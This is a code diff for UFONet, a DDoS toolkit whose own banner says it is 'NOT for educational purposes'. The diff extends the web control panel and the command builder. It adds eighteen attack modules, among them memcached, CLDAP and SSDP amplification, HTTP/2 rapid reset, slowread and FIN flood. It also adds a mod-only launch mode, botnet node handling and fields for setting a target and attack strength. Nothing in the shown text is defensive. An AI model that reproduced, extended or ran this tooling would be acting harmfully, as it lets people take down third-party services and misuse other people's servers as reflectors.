+                        cmd += "--cldap " +str(self.supply_cldap)+ " "
+                    if int(self.supply_ssdp) > 0:
+                        cmd += "--ssdp " +str(self.supply_ssdp)+ " "
+                    if int(self.supply_qotd) > 0:
+                        cmd += "--qotd " +str(self.supply_qotd)+ " "
+                    if int(self.supply_tftp) > 0:
+                        cmd += "--tftp " +str(self.supply_tftp)+ " "
+                    if int(self.supply_wsdisco) > 0:
+                        cmd += "--wsdisco " +str(self.supply_wsdisco)+ " "
+                    if int(self.supply_coap) > 0:
+                        cmd += "--coap " +str(self.supply_coap)+ " "
+                    if int(self.supply_mssql) > 0:
+                        cmd += "--mssql " +str(self.supply_mssql)+ " "
+                    if int(self.supply_arms) > 0:
+                        cmd += "--arms " +str(self.supply_arms)+ " "
+                    if int(self.supply_plex) > 0:
+                        cmd += "--plex " +str(self.supply_plex)+ " "
+                    if int(self.supply_netbios) > 0:
+                        cmd += "--netbios " +str(self.supply_netbios)+ " "
+                    if int(self.supply_ripv1) > 0:
+                        cmd += "--ripv1 " +str(self.supply_ripv1)+ " "
+                    if int(self.supply_middlebox) > 0:
+                        cmd += "--middlebox " +str(self.supply_middlebox)+ " "
+                    if int(self.supply_rapidreset) > 0:
+                        cmd += "--rapidreset " +str(self.supply_rapidreset)+ " "
+                    if int(self.supply_slowread) > 0:
+                        cmd += "--slowread " +str(self.supply_slowread)+ " "
+                    if int(self.supply_goldeneye) > 0:
+                        cmd += "--goldeneye " +str(self.supply_goldeneye)+ " "
+                    if int(self.supply_finflood) > 0:
+                        cmd += "--finflood " +str(self.supply_finflood)+ " "
                     if not flag_fraggle and not flag_sniper and not flag_ufoack and not flag_uforst and not flag_droper and not flag_overlap and not flag_pinger and not flag_ufoudp and not flag_monlist and not flag_tachyon and not flag_nuke and not flag_xmas and not flag_smurf and not flag_spray and not flag_ufosyn:
                         cmd = nonroot_cmd + cmd # non root required (LOIC, LORIS)
                     if flag_ufosyn == True or flag_spray == True or flag_smurf == True or flag_xmas == True or flag_nuke == True or flag_tachyon == True or flag_monlist == True or flag_fraggle == True or flag_sniper == True or flag_ufoack == True or flag_uforst == True or flag_droper == True or flag_overlap == True or flag_pinger == True or flag_ufoudp == True:
@@ -2786,6 +2958,24 @@ Last update: <font color='"""+ self.blackholes_status_color + """'>"""+ self.bla
         self.aoverlap = data["overlap"]
         self.apinger = data["pinger"]
         self.aufoudp = data["ufoudp"]
+        self.amemcached = data.get("memcached", 0)
+        self.achargen = data.get("chargen", 0)
+        self.acldap = data.get("cldap", 0)
+        self.assdp = data.get("ssdp", 0)
+        self.aqotd = data.get("qotd", 0)
+        self.atftp = data.get("tftp", 0)
+        self.awsdisco = data.get("wsdisco", 0)
+        self.acoap = data.get("coap", 0)
+        self.amssql = data.get("mssql", 0)
+        self.aarms = data.get("arms", 0)
+        self.aplex = data.get("plex", 0)
+        self.anetbios = data.get("netbios", 0)
+        self.aripv1 = data.get("ripv1", 0)
+        self.amiddlebox = data.get("middlebox", 0)
+        self.arapidreset = data.get("rapidreset", 0)
+        self.aslowread = data.get("slowread", 0)
+        self.agoldeneye = data.get("goldeneye", 0)
+        self.afinflood = data.get("finflood", 0)
         self.tcrashed = data["crashed"]
         if int(self.acompleted) > 0: # check for attacks completed
             self.mothership_acc = Decimal((int(self.tcrashed) * 100) / int(self.acompleted)) # decimal rate: crashed*100/completed
@@ -2897,6 +3087,28 @@ Last update: <font color='"""+ self.blackholes_status_color + """'>"""+ self.bla
             self.list_snmps.append(name_snmp)
         self.num_snmps = str(len(self.snmps))
         f.close()
+        self.list_zombies = [n or self.zombies[i].strip() for i, n in enumerate(self.list_zombies)]
+        self.list_aliens = [n or self.aliens[i].strip() for i, n in enumerate(self.list_aliens)]
+        self.list_droids = [n or self.droids[i].strip() for i, n in enumerate(self.list_droids)]
+        self.list_ucavs = [n or self.ucavs[i].strip() for i, n in enumerate(self.list_ucavs)]
+        self.list_rpcs = [n or self.rpcs[i].strip() for i, n in enumerate(self.list_rpcs)]
+        self.list_ntps = [n or self.ntps[i].strip() for i, n in enumerate(self.list_ntps)]
+        self.list_dnss = [n or self.dnss[i].strip() for i, n in enumerate(self.list_dnss)]
+        self.list_snmps = [n or self.snmps[i].strip() for i, n in enumerate(self.list_snmps)]
+        def _wrap(value):
+            v = value.strip()
+            if not v:
+                return v
+            href = v if v.startswith(('http://', 'https://')) else 'http://' + v
+            return '<a href="' + href + '" target="_blank">' + v + '</a>'
+        self.zombies = [_wrap(x) for x in self.zombies]
+        self.aliens = [_wrap(x) for x in self.aliens]
+        self.droids = [_wrap(x) for x in self.droids]
+        self.ucavs = [_wrap(x) for x in self.ucavs]
+        self.rpcs = [_wrap(x) for x in self.rpcs]
+        self.ntps = [_wrap(x) for x in self.ntps]
+        self.dnss = [_wrap(x) for x in self.dnss]
+        self.snmps = [_wrap(x) for x in self.snmps]
         self.total_botnet = str(int(self.num_zombies) + int(self.num_aliens) + int(self.num_droids) + int(self.num_ucavs) + int(self.num_rpcs) + int(self.num_ntps) + int(self.num_dnss) + int(self.num_snmps))
         f = open(self.wargames_file, "r")
         ls = f.readlines()
@@ -3002,7 +3214,7 @@ function startTyping(textParam, delayParam, destinationParam)
 </td>
 <td><img src='data:image/png;base64,"""+self.ufonet_logo_img+"""'></td><td>
 </td></tr></table><br>
-<br /><b><a href="https://ufonet.03c8.net" target="_blank">UFONet</a></b> - is a /disruptive_toolkit/ that allows to perform <a href="https://en.wikipedia.org/wiki/Distributed_denial-of-service" target="_blank">DDoS</a> and <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">DoS</a> attacks ...<br /><br />
+<br /><b><a href="https://ufonet.03c8.net" target="_blank">UFONet</a></b> - is a /disruptive_toolkit/ that allows to perform <a href="https://en.wikipedia.org/wiki/Distributed_denial-of-service" target="_blank">DDoS</a> and <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">DoS</a> attacks ...<br /><br /><font color="yellow">w3ap0n1z1ng l33t/h4ckt1v1sts/cr4ck3rs/sK1ds...<br />&nbsp;&nbsp;4 pWn1ng c0rrupt$/g0vs/evilC0rps...<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8======D&nbsp;&nbsp;<font color="red">$1nce: <b>2013</b></font> &lt;-</font><br /><br />
 <div id="tt">REMEMBER -> This code is NOT for educational purposes!</div><br />
 <script type="text/javascript">
 startTyping(text, 80, "tt");
@@ -3217,15 +3429,17 @@ function HideAll()
   * Search using this search engine: <select id="engines_list">
   <option value="duck" selected>duck</option>
   <option value="bing">bing</option>
+  <option value="brave">brave</option>
+  <option value="mojeek">mojeek</option>
   <option value="yahoo">yahoo</option>
-<!--  <option value="google">google (no TOR!)</option>-->
-<!--  <option value="yandex">yandex</option>-->
+  <option value="startpage">startpage</option>
+  <option value="ecosia">ecosia</option>
   </select></div><div id="allengines_pattern" style="display:none;">
   * Search using all search engines: <input type="checkbox" name="all_engines" id="all_engines" onchange="showHideEngines()"></div><div id="sex_engine" name="sex_engine" style="display:none;">
   * Exclude this search engines: <input type="text" name="exclude_engines" id="exclude_engines" size="10" placeholder="Yahoo,Bing"></div></form>
   <button title="Start to search for zombies..." style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;" onClick=Start()>SEARCH!</button>
 <br><hr>
-<br>Download Botnet: <center><br><a href='javascript:runCommandX("cmd_list_nodes")'>LIST NODES</a> | <a href='javascript:runCommandX("cmd_download_nodes")'>TAKE ALL!</a> | <input type="text" name="download_botnet_ip" id="download_botnet_ip" size="20" value='"""+default_blackhole+"""'> <button title="Start to search for zombies..." style="color:yellow; height:40px; width:140px; font-weight:bold; background-color:red; border: 2px solid yellow;" onClick=Download_Botnet_IP()>TAKE IT!</button></center>
+<br>Download Botnet: <center><br><a href='javascript:runCommandX("cmd_list_nodes")'>LIST NODES</a> | <a href='javascript:runCommandX("cmd_download_nodes")'>TAKE ALL!</a> | <input type="text" name="download_botnet_ip" id="download_botnet_ip" size="20" value=''> <button title="Start to search for zombies..." style="color:yellow; height:40px; width:140px; font-weight:bold; background-color:red; border: 2px solid yellow;" onClick=Download_Botnet_IP()>TAKE IT!</button></center>
 <hr>
 Test Botnet: <center><br><a href='javascript:runCommandX("cmd_test_offline")'>Offline</a> | <a href='javascript:runCommandX("cmd_test_all")'>ALL</a> | <a href='javascript:runCommandX("cmd_test_army")'>Zombies</a> | <a href='javascript:runCommandX("cmd_test_rpcs")'>XML-RPCs</a> | <a href='javascript:runCommandX("cmd_attack_me")'>Attack Me!</a></center>
 <hr>
@@ -3264,9 +3478,40 @@ View Botnet: <button title="Build a map and geo-deploy your botnet on it..." onc
 function Requests() {
         var win_requests = window.open("requests","_blank","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
       }
+function DisableEmptyMods() {
+        var _x = new XMLHttpRequest();
+        _x.open("GET", "/cmd_mods_status", true);
+        _x.onreadystatechange = function(){
+            if(_x.readyState==4 && _x.status==200){
+                var parts = _x.responseText.split(" ");
+                for(var i=0;i<parts.length;i++){
+                    var kv = parts[i].split("=");
+                    if(kv.length!==2) continue;
+                    var name = kv[0], n = parseInt(kv[1],10);
+                    var el = document.getElementById(name);
+                    if(!el) continue;
+                    if(n>0){
+                        el.disabled = false;
+                        el.title = "Reflectors available: "+n;
+                        el.style.background = "";
+                        el.style.color = "";
+                    } else {
+                        el.disabled = true;
+                        el.value = "";
+                        el.title = "No real reflectors in botnet/"+(name=="tachyon"?"dns":(name=="monlist"?"ntp":(name=="sniper"?"snmp":name)))+".txt -> populate first";
+                        el.style.background = "#222";
+                        el.style.color = "#666";
+                        el.placeholder = "n/a";
+                    }
+                }
+            }
+        };
+        _x.send();
+      }
 function ShowPanel() {
         if (document.getElementById("extra_attack").checked){
                document.getElementById("extra_panel").style.display = "block";
+               DisableEmptyMods();
                document.getElementById("loic").value = "";
                document.getElementById("loris").value = "";
                document.getElementById("ufosyn").value = "";
@@ -3284,6 +3529,24 @@ function ShowPanel() {
                document.getElementById("overlap").value = "";
                document.getElementById("pinger").value = "";
                document.getElementById("ufoudp").value = "";
+               document.getElementById("memcached").value = "";
+               document.getElementById("chargen").value = "";
+               document.getElementById("cldap").value = "";
+               document.getElementById("ssdp").value = "";
+               document.getElementById("qotd").value = "";
+               document.getElementById("tftp").value = "";
+               document.getElementById("wsdisco").value = "";
+               document.getElementById("coap").value = "";
+               document.getElementById("mssql").value = "";
+               document.getElementById("arms").value = "";
+               document.getElementById("plex").value = "";
+               document.getElementById("netbios").value = "";
+               document.getElementById("ripv1").value = "";
+               document.getElementById("middlebox").value = "";
+               document.getElementById("rapidreset").value = "";
+               document.getElementById("slowread").value = "";
+               document.getElementById("goldeneye").value = "";
+               document.getElementById("finflood").value = "";
                document.getElementById("dbstress").value = "";
              } else {
                document.getElementById("extra_panel").style.display = "none";
@@ -3304,12 +3567,38 @@ function ShowPanel() {
                document.getElementById("overlap").value = "";
                document.getElementById("pinger").value = "";
                document.getElementById("ufoudp").value = "";
+               document.getElementById("memcached").value = "";
+               document.getElementById("chargen").value = "";
+               document.getElementById("cldap").value = "";
+               document.getElementById("ssdp").value = "";
+               document.getElementById("qotd").value = "";
+               document.getElementById("tftp").value = "";
+               document.getElementById("wsdisco").value = "";
+               document.getElementById("coap").value = "";
+               document.getElementById("mssql").value = "";
+               document.getElementById("arms").value = "";
+               document.getElementById("plex").value = "";
+               document.getElementById("netbios").value = "";
+               document.getElementById("ripv1").value = "";
+               document.getElementById("middlebox").value = "";
+               document.getElementById("rapidreset").value = "";
+               document.getElementById("slowread").value = "";
+               document.getElementById("goldeneye").value = "";
+               document.getElementById("finflood").value = "";
                document.getElementById("dbstress").value = "";
              }
       }
 function Maps() {
          var win_map = window.open("/cmd_view_attack?target="+target,"_blank","fullscreen=yes, resizable=yes", false);
          win_map.resizeTo(screen.width,screen.height);
+      }
+function ShowModOnly() {
+        if (document.getElementById("mod_only").checked){
+            if (!document.getElementById("extra_attack").checked){
+                document.getElementById("extra_attack").checked = true;
+                ShowPanel();
+            }
+        }
       }
 function Start(){
         document.getElementById("attack_button").text = "STOP!"
@@ -3339,22 +3628,58 @@ function Start(){
              overlap=document.getElementById("overlap").value
              pinger=document.getElementById("pinger").value
              ufoudp=document.getElementById("ufoudp").value
-             if(ufosyn || spray || smurf || xmas || nuke || tachyon || monlist || fraggle || sniper || ufoack || uforst || droper || overlap || pinger || ufoudp){ // root required!
-               window.alert("You need 'root' access!. Check shell and enter your password.");
+             memcached=document.getElementById("memcached").value
+             chargen=document.getElementById("chargen").value
+             cldap=document.getElementById("cldap").value
+             ssdp=document.getElementById("ssdp").value
+             qotd=document.getElementById("qotd").value
+             tftp=document.getElementById("tftp").value
+             wsdisco=document.getElementById("wsdisco").value
+             coap=document.getElementById("coap").value
+             mssql=document.getElementById("mssql").value
+             arms=document.getElementById("arms").value
+             plex=document.getElementById("plex").value
+             netbios=document.getElementById("netbios").value
+             ripv1=document.getElementById("ripv1").value
+             middlebox=document.getElementById("middlebox").value
+             rapidreset=document.getElementById("rapidreset").value
+             slowread=document.getElementById("slowread").value
+             goldeneye=document.getElementById("goldeneye").value
+             finflood=document.getElementById("finflood").value
+             mod_only=document.getElementById("mod_only").checked?"on":"off"
+             if(ufosyn || spray || smurf || xmas || nuke || tachyon || monlist || fraggle || sniper || ufoack || uforst || droper || overlap || pinger || ufoudp || memcached || chargen || cldap || ssdp || qotd || tftp || wsdisco || coap || mssql || arms || plex || netbios || ripv1 || middlebox || rapidreset || slowread || finflood){ // root required!
+               window.alert("You need 'root' access! A shell prompt will appear; enter your sudo password to continue.");
              }
-             params="path="+escape(path)+"&rounds="+escape(rounds)+"&target="+escape(target)+"&dbstress="+escape(dbstress)+"&loic="+escape(loic)+"&loris="+escape(loris)+"&ufosyn="+escape(ufosyn)+"&spray="+escape(spray)+"&smurf="+escape(smurf)+"&xmas="+escape(xmas)+"&nuke="+escape(nuke)+"&tachyon="+escape(tachyon)+"&monlist="+escape(monlist)+"&fraggle="+escape(fraggle)+"&sniper="+escape(sniper)+"&ufoack="+escape(ufoack)+"&uforst="+escape(uforst)+"&droper="+escape(droper)+"&overlap="+escape(overlap)+"&pinger="+escape(pinger)+"&ufoudp="+escape(ufoudp)
+             if(mod_only=="on" && !(loic || loris || ufosyn || spray || smurf || xmas || nuke || tachyon || monlist || fraggle || sniper || ufoack || uforst || droper || overlap || pinger || ufoudp || memcached || chargen || cldap || ssdp || qotd || tftp || wsdisco || coap || mssql || arms || plex || netbios || ripv1 || middlebox || rapidreset || slowread || goldeneye || finflood || dbstress)){
+               window.alert("Mod-only mode requires at least one Extra(s) attack.");
+               return
+             }
+             var _qs = "mod_only="+escape(mod_only)
+                  +"&dbstress="+escape(dbstress)
+                  +"&loic="+escape(loic)+"&loris="+escape(loris)+"&slowread="+escape(slowread)+"&goldeneye="+escape(goldeneye)+"&rapidreset="+escape(rapidreset)+"&finflood="+escape(finflood)
+                  +"&ufosyn="+escape(ufosyn)+"&xmas="+escape(xmas)+"&nuke="+escape(nuke)+"&ufoack="+escape(ufoack)+"&uforst="+escape(uforst)+"&droper="+escape(droper)+"&overlap="+escape(overlap)+"&pinger="+escape(pinger)+"&ufoudp="+escape(ufoudp)
+                  +"&spray="+escape(spray)+"&smurf="+escape(smurf)+"&fraggle="+escape(fraggle)+"&tachyon="+escape(tachyon)+"&monlist="+escape(monlist)+"&sniper="+escape(sniper)
+                  +"&memcached="+escape(memcached)+"&chargen="+escape(chargen)+"&cldap="+escape(cldap)+"&ssdp="+escape(ssdp)+"&qotd="+escape(qotd)+"&tftp="+escape(tftp)+"&wsdisco="+escape(wsdisco)+"&coap="+escape(coap)+"&mssql="+escape(mssql)+"&arms="+escape(arms)+"&plex="+escape(plex)+"&netbios="+escape(netbios)+"&ripv1="+escape(ripv1)+"&middlebox="+escape(middlebox);
+             var _check = new XMLHttpRequest();
+             _check.open("GET", "/cmd_army_check?"+_qs, false);
+             _check.send(null);
+             if(_check.status==200 && _check.responseText.indexOf("err=")===0){
+                window.alert("Pre-flight check FAILED:\\n\\n"+_check.responseText.substring(4)+"\\n\\nSearch via dorking (zombies / open redirects):\\n  ./ufonet -s 'page.php?url='\\n  ./ufonet --auto-search\\n\\nOr scan your authorized scope for amp reflectors (memcached UDP/11211, ssdp UDP/1900, etc.) and add the real IPs to the corresponding botnet/<mod>.txt files.\\n\\nMods that hit the target directly from your IP/network (LOIC, LORIS, SLOWREAD, GOLDENEYE, RAPIDRESET, UFOSYN, NUKE, XMAS, UFOACK, UFORST, DROPER, OVERLAP, PINGER, UFOUDP, FINFLOOD) do NOT need any botnet file.");
+                return
+             }
+             params="path="+escape(path)+"&rounds="+escape(rounds)+"&target="+escape(target)+"&mod_only="+escape(mod_only)+"&dbstress="+escape(dbstress)+"&loic="+escape(loic)+"&loris="+escape(loris)+"&ufosyn="+escape(ufosyn)+"&spray="+escape(spray)+"&smurf="+escape(smurf)+"&xmas="+escape(xmas)+"&nuke="+escape(nuke)+"&tachyon="+escape(tachyon)+"&monlist="+escape(monlist)+"&fraggle="+escape(fraggle)+"&sniper="+escape(sniper)+"&ufoack="+escape(ufoack)+"&uforst="+escape(uforst)+"&droper="+escape(droper)+"&overlap="+escape(overlap)+"&pinger="+escape(pinger)+"&ufoudp="+escape(ufoudp)+"&memcached="+escape(memcached)+"&chargen="+escape(chargen)+"&cldap="+escape(cldap)+"&ssdp="+escape(ssdp)+"&qotd="+escape(qotd)+"&tftp="+escape(tftp)+"&wsdisco="+escape(wsdisco)+"&coap="+escape(coap)+"&mssql="+escape(mssql)+"&arms="+escape(arms)+"&plex="+escape(plex)+"&netbios="+escape(netbios)+"&ripv1="+escape(ripv1)+"&middlebox="+escape(middlebox)+"&rapidreset="+escape(rapidreset)+"&slowread="+escape(slowread)+"&goldeneye="+escape(goldeneye)+"&finflood="+escape(finflood)
              if (document.getElementById("visual_attack").checked){
                 document.getElementById("visual_attack").value = "on";
              } else {
                 document.getElementById("visual_attack").value = "off";
              }
-             if(document.getElementById("visual_attack").value=="on"){
-                Maps() 
-             }
         }else{
           window.alert("You need to enter a valid url: http(s)://target.com");
           return
         }
+	if(document.getElementById("visual_attack").value=="on"){
+	   Maps()
+	}
 	runCommandX("cmd_attack",params)
 }
 </script>
@@ -3379,7 +3704,7 @@ function Start(){
 <table bgcolor="black" cellpadding="24" cellspacing="25" border="1">
 <tr><td>
 <pre>
-  Set your target:     <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+">
+  Set your target:     <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+"> <input type="checkbox" name="mod_only" id="mod_only" title="Mod-only (-m): launch Extra(s) without zombies / open-redirect" onclick='javascript:ShowModOnly();'> Mod-only
 
   Set place to attack: <input type="text" name="path" id="path" size="30" placeholder="/path/big.jpg">
 
@@ -3395,22 +3720,44 @@ function Start(){
 <td align="left"><a href="https://en.wikipedia.org/wiki/SYN_flood" target="_blank">UFOSYN</a>:</td><td align="right"> <input type="text" name="ufosyn" id="ufosyn" size="4" placeholder="100"></td>
 <td align="left"><a href="https://en.wikipedia.org/wiki/Fraggle_attack" target="_blank">FRAGGLE</a>:</td><td align="right"> <input type="text" name="fraggle" id="fraggle" size="4" placeholder="101"></td>
 </tr><tr>
-<td align="left"><a href="https://ddos-guard.net/en/terminology/attack_type/rst-or-fin-flood" target="_blank">UFORST</a>:</td><td align="right"> <input type="text" name="uforst" id="uforst" size="4" placeholder="101"></td>
-<td align="left"><a href="https://en.wikipedia.org/wiki/DRDOS" target="_blank">SPRAY</a>:</td><td align="right">  <input type="text" name="spray" id="spray" size="4" placeholder="110"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/TCP_reset_attack" target="_blank">UFORST</a>:</td><td align="right"> <input type="text" name="uforst" id="uforst" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Denial-of-service_attack#Reflected_attack" target="_blank">SPRAY</a>:</td><td align="right">  <input type="text" name="spray" id="spray" size="4" placeholder="110"></td>
 <td align="left"><a href="https://en.wikipedia.org/wiki/Smurf_attack" target="_blank">SMURF</a>:</td><td align="right">  <input type="text" name="smurf" id="smurf" size="4" placeholder="100"></td>
 <td align="left"><a href="https://en.wikipedia.org/wiki/Christmas_tree_packet" target="_blank">XMAS</a>:</td><td align="right">   <input type="text" name="xmas" id="xmas" size="4" placeholder="111"></td>
 </tr><tr>
 <td align="left"><a href="https://en.wikipedia.org/wiki/IP_fragmentation_attack" target="_blank">DROPER</a>:</td><td align="right">   <input type="text" name="droper" id="droper" size="4" placeholder="101"></td>
-<td align="left"><a href="https://www.imperva.com/learn/application-security/snmp-reflection/" target="_blank">SNIPER</a>:</td><td align="right">   <input type="text" name="sniper" id="sniper" size="4" placeholder="100"></td>
-<td align="left"><a href="https://www.us-cert.gov/ncas/alerts/TA13-088A" target="_blank">TACHYON</a>:</td><td align="right">   <input type="text" name="tachyon" id="tachyon" size="4" placeholder="100"></td>
-<td align="left"><a href="https://www.cloudflare.com/learning/ddos/ping-icmp-flood-ddos-attack/" target="_blank">PINGER</a>:</td><td align="right">   <input type="text" name="pinger" id="pinger" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol" target="_blank">SNIPER</a>:</td><td align="right">   <input type="text" name="sniper" id="sniper" size="4" placeholder="100"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/DNS_amplification_attack" target="_blank">TACHYON</a>:</td><td align="right">   <input type="text" name="tachyon" id="tachyon" size="4" placeholder="100"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Ping_flood" target="_blank">PINGER</a>:</td><td align="right">   <input type="text" name="pinger" id="pinger" size="4" placeholder="101"></td>
 </tr><tr>
-<td align="left"><a href="https://www.us-cert.gov/ncas/alerts/TA14-013A" target="_blank">MONLIST</a>:</td><td align="right">   <input type="text" name="monlist" id="monlist" size="4" placeholder="101"></td>
-<td align="left"><a href="https://www.f5.com/services/resources/glossary/push-and-ack-flood" target="_blank">UFOACK</a>:</td><td align="right">   <input type="text" name="ufoack" id="ufoack" size="4" placeholder="100"></td>
-<td align="left"><a href="https://cyberhoot.com/cybrary/fragment-overlap-attack/" target="_blank">OVERLAP</a>:</td><td align="right">   <input type="text" name="overlap" id="overlap" size="4" placeholder="100"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/NTP_server_misuse_and_abuse" target="_blank">MONLIST</a>:</td><td align="right">   <input type="text" name="monlist" id="monlist" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">UFOACK</a>:</td><td align="right">   <input type="text" name="ufoack" id="ufoack" size="4" placeholder="100"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/IP_fragmentation_attack#Overlapping_fragment_attack" target="_blank">OVERLAP</a>:</td><td align="right">   <input type="text" name="overlap" id="overlap" size="4" placeholder="100"></td>
 <td align="left"><a href="https://en.wikipedia.org/wiki/UDP_flood_attack" target="_blank">UFOUDP</a>:</td><td align="right">   <input type="text" name="ufoudp" id="ufoudp" size="4" placeholder="101"></td>
 </tr><tr>
-<td align="left"><a href="https://dl.packetstormsecurity.net/papers/general/tcp-starvation.pdf" target="_blank">NUKE</a>:</td><td align="right">   <input type="text" name="nuke" id="nuke" size="4" placeholder="1001"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Sockstress" target="_blank">NUKE</a>:</td><td align="right">   <input type="text" name="nuke" id="nuke" size="4" placeholder="1001"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Memcached" target="_blank">MEMCACHED</a>:</td><td align="right">   <input type="text" name="memcached" id="memcached" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Character_Generator_Protocol" target="_blank">CHARGEN</a>:</td><td align="right">   <input type="text" name="chargen" id="chargen" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol" target="_blank">CLDAP</a>:</td><td align="right">   <input type="text" name="cldap" id="cldap" size="4" placeholder="101"></td>
+</tr><tr>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Simple_Service_Discovery_Protocol" target="_blank">SSDP</a>:</td><td align="right">   <input type="text" name="ssdp" id="ssdp" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/QOTD" target="_blank">QOTD</a>:</td><td align="right">   <input type="text" name="qotd" id="qotd" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol" target="_blank">TFTP</a>:</td><td align="right">   <input type="text" name="tftp" id="tftp" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/WS-Discovery" target="_blank">WSDISCO</a>:</td><td align="right">   <input type="text" name="wsdisco" id="wsdisco" size="4" placeholder="101"></td>
+</tr><tr>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Constrained_Application_Protocol" target="_blank">COAP</a>:</td><td align="right">   <input type="text" name="coap" id="coap" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Microsoft_SQL_Server" target="_blank">MSSQL</a>:</td><td align="right">   <input type="text" name="mssql" id="mssql" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Apple_Remote_Desktop" target="_blank">ARMS</a>:</td><td align="right">   <input type="text" name="arms" id="arms" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Plex_(software)" target="_blank">PLEX</a>:</td><td align="right">   <input type="text" name="plex" id="plex" size="4" placeholder="101"></td>
+</tr><tr>
+<td align="left"><a href="https://en.wikipedia.org/wiki/NetBIOS" target="_blank">NETBIOS</a>:</td><td align="right">   <input type="text" name="netbios" id="netbios" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Routing_Information_Protocol" target="_blank">RIPV1</a>:</td><td align="right">   <input type="text" name="ripv1" id="ripv1" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Network_middlebox" target="_blank">MIDDLEBOX</a>:</td><td align="right">   <input type="text" name="middlebox" id="middlebox" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/HTTP/2" target="_blank">RAPIDRESET</a>:</td><td align="right">   <input type="text" name="rapidreset" id="rapidreset" size="4" placeholder="101"></td>
+</tr><tr>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Slowloris_(software)" target="_blank">SLOWREAD</a>:</td><td align="right">   <input type="text" name="slowread" id="slowread" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Denial-of-service_attack#Application-layer_attacks" target="_blank">GOLDENEYE</a>:</td><td align="right">   <input type="text" name="goldeneye" id="goldeneye" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_termination" target="_blank">FINFLOOD</a>:</td><td align="right">   <input type="text" name="finflood" id="finflood" size="4" placeholder="101"></td>
 </tr>
 </table>
 <hr>
@@ -3469,7 +3816,7 @@ function Browser() {
            It also works as an encrypted <a href="https://en.wikipedia.org/wiki/Darknet" target="_blank">DarkNET</a> to publish and receive
            content by creating a global client/server network based on 
            a direct-connect <a href="https://en.wikipedia.org/wiki/Peer-to-peer" target="_blank">P2P</a> architecture.</div><div><a id="mH3" href="javascript:show('nb3');" style="text-decoration: none;" >+ F.A.Q.</a></div><div class="nb" id="nb3" style="display: none;">
-    - <a href="https://ufonet.03c8.net/FAQ.html" target="_blak">Online version</a> (updated!)
+    - <a href="https://ufonet.03c8.net/FAQ.html" target="_blank">Online version</a>
     - <a href="/faq" target="_blank">Local version</a></div>
 <div><a id="mH4" href="javascript:show('nb4');" style="text-decoration: none;" >+ Issues</a></div><div class="nb" id="nb4" style="display: none;">
   If you have questions (or technical problems)
@@ -3482,7 +3829,7 @@ function Browser() {
     - Donating; money, objects, privacy, exploits, <a href="https://en.wikipedia.org/wiki/Love" target="_blank">love</a> ;-)
 
       - <a href="https://explorer.bitcoin.com/btc" target="_blank">Bitcoin [BTC]</a>: <b>19aXfJtoYJUoXEZtjNwsah2JKN9CK5Pcjw</b>
-      - <a href="https://ecoin.03c8.net/blockexplorer" target="_blank">Ecoin [ECO]</a>: <b>ETsRCBzaMawx3isvb5svX7tAukLdUFHKze</b></div> <div><a id="mH6" href="javascript:show('nb6');" style="text-decoration: none" >+ Contact</a></div> <div class="nb" id="nb6" style="display: none;">   - <a target="_blank" href="wormhole">Wormhole</a>: irc.freenode.net / #ufonet
+      - <a href="https://ecoin.03c8.net/blockexplorer" target="_blank">Ecoin [ECO]</a>: <b>EZnYs33TG87ZzBWgADrj8653s3bPUqreW9</b></div> <div><a id="mH6" href="javascript:show('nb6');" style="text-decoration: none" >+ Contact</a></div> <div class="nb" id="nb6" style="display: none;">   - <a target="_blank" href="wormhole">Wormhole</a>: irc.libera.chat / #UFONet
    - Email: <a href="mailto: epsylon@riseup.net">epsylon@riseup.net</a> [GPG:0xB8AC3776]
 </div></td></tr>
 <tr>
@@ -3491,24 +3838,42 @@ function Browser() {
 <tr>
 <td><h2><u>Types of Attacks:</u></h2> 
 <table cellpadding="5" cellspacing="5" border="1"><tr>
-<td><a href="https://hydrasky.com/network-security/layer-7-ddos-attack/" target="_blank">LAYER-7</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Denial-of-service_attack#Application-layer_attacks" target="_blank">LAYER-7</a></td>
 <td><a href="https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon" target="_blank">LOIC</a></td>
